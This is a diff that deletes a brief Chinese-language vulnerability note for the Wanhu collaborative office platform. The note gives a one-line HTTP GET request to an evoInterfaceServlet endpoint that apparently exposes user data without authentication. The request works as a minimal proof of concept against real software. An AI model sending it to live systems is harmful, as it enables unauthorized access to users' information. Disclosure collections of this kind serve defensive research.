@@ -1,8 +1,0 @@
-# 万户协同办公平台存在未授权访问漏洞
-
-## 万户协同办公平台存在未授权访问漏洞
-```
-
-GET /defaultroot/evoInterfaceServlet?paramType=user
-```
-
